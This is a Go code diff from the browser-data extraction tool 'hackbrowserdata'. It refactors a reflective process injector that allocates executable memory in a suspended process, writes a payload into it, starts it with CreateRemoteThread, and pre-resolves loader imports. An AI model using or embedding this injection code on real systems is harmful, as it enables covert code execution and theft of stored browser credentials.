@@ -12,6 +12,7 @@ import (
 	"golang.org/x/sys/windows"
 
 	"github.com/moond4rk/hackbrowserdata/crypto/windows/abe_native/bootstrap"
+	"github.com/moond4rk/hackbrowserdata/utils/winapi"
 )
 
 type Reflective struct {
@@ -149,11 +150,10 @@ func spawnSuspended(exePath string) (*windows.ProcessInformation, error) {
 }
 
 func writeRemotePayload(proc windows.Handle, payload []byte) (uintptr, error) {
-	remoteBase, err := callBoolErr(procVirtualAllocEx,
-		uintptr(proc), 0,
+	remoteBase, err := winapi.VirtualAllocEx(proc,
 		uintptr(len(payload)),
-		uintptr(windows.MEM_COMMIT|windows.MEM_RESERVE),
-		uintptr(windows.PAGE_EXECUTE_READWRITE),
+		uint32(windows.MEM_COMMIT|windows.MEM_RESERVE),
+		uint32(windows.PAGE_EXECUTE_READWRITE),
 	)
 	if err != nil {
 		return 0, fmt.Errorf("injector: %w", err)
@@ -171,15 +171,13 @@ func writeRemotePayload(proc windows.Handle, payload []byte) (uintptr, error) {
 
 func runAndWait(proc windows.Handle, remoteBase uintptr, loaderRVA uint32, wait time.Duration) error {
 	entry := remoteBase + uintptr(loaderRVA)
-	hThread, err := callBoolErr(procCreateRemoteThread,
-		uintptr(proc), 0, 0, entry, 0, 0, 0,
-	)
+	hThread, err := winapi.CreateRemoteThread(proc, entry, 0)
 	if err != nil {
 		return fmt.Errorf("injector: %w", err)
 	}
-	defer windows.CloseHandle(windows.Handle(hThread))
+	defer windows.CloseHandle(hThread)
 
-	state, err := windows.WaitForSingleObject(windows.Handle(hThread), uint32(wait/time.Millisecond))
+	state, err := windows.WaitForSingleObject(hThread, uint32(wait/time.Millisecond))
 	if err != nil {
 		return fmt.Errorf("injector: WaitForSingleObject: %w", err)
 	}
@@ -243,11 +241,11 @@ func patchPreresolvedImports(payload []byte) ([]byte, error) {
 		return nil, fmt.Errorf("injector: payload too small for pre-resolved import patch")
 	}
 
-	pLoadLibraryA := procLoadLibraryA.Addr()
-	pGetProcAddress := procGetProcAddress.Addr()
-	pVirtualAlloc := procVirtualAlloc.Addr()
-	pVirtualProtect := procVirtualProtect.Addr()
-	pNtFlushIC := procNtFlushIC.Addr()
+	pLoadLibraryA := winapi.AddrLoadLibraryA()
+	pGetProcAddress := winapi.AddrGetProcAddress()
+	pVirtualAlloc := winapi.AddrVirtualAlloc()
+	pVirtualProtect := winapi.AddrVirtualProtect()
+	pNtFlushIC := winapi.AddrNtFlushInstructionCache()
 
 	if pLoadLibraryA == 0 || pGetProcAddress == 0 || pVirtualAlloc == 0 ||
 		pVirtualProtect == 0 || pNtFlushIC == 0 {
